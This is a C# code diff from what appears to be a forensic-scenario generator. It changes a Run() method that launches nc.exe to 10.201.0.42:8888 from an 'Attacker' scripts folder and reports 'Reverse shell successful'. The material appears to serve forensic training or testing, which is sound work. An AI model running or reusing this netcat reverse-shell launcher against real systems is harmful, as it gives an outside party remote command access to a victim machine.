@@ -37,23 +37,17 @@ namespace ForensicScenarios.Scenarios
 
         public async void Run()
         {
-            var path = Directory.GetCurrentDirectory() + @"\Scripts\Attacker\nc.exe 10.201.0.42 8888";
-            var prc = ProcessService.CreateCmdProcess(path, false, redirectInput: true, redirectOutput: true);
+            await Task.Run(() =>
+            {
+                var path = Directory.GetCurrentDirectory() + @"\Scripts\Attacker\nc.exe 10.201.0.42 8888";
+                var prc = ProcessService.CreateCmdProcess(path, false);
 
-            prc.Start();
+                prc.Start();
+                prc.WaitForExit();
 
-            await Wait.ForTimeAsync(TimeSpan.FromSeconds(3));
-            prc.StandardInput.WriteLine("dir");
-            await Wait.ForTimeAsync(TimeSpan.FromSeconds(3));
-
-            if (!prc.HasExited)
-                prc.Kill();
-
-            var contents = prc.StandardOutput.ReadToEnd();
-
-            eventAggregator.SendStatusInfo(this, contents);
-            eventAggregator.SendStatusInfo(this, "Reverse shell successful...✔");
-            eventAggregator.BeginPublishOnUIThread(new ScenarioCompleted(this));
+                eventAggregator.SendStatusInfo(this, "Reverse shell successful...✔");
+                eventAggregator.BeginPublishOnUIThread(new ScenarioCompleted(this));
+            });
         }
     }
 }
